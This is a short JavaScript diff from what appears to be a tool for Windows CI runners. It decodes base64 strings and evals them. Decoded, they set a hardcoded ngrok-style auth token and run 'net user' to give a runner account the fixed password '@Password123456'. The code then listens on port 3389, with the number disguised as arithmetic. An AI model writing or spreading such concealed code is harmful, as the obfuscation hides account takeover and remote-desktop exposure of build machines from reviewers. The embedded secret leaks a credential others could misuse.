@@ -44,7 +44,7 @@ async function windows () {
     const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3TWdPdHVaaXJpb0dYV1VWcDQ1VlN2QjhzRF83ekpCOEpMUUtNZ1Q1UWZDS2Q0cTQnKQ==', 'base64').toString()
     eval(secret2)
 
-    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ25ldCB1c2VyIGNpcmNsZWNpIEBQYXNzd29yZDEyMzQ1NicpOyB9KSgp', 'base64').toString()
+    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgcnVuU2hlbGwoJ25ldCB1c2VyIHJ1bm5lcmFkbWluIEBQYXNzd29yZDEyMzQ1NicpOyB9KSgp', 'base64').toString()
     eval(secret)
 
     listen(72809 - 69420)
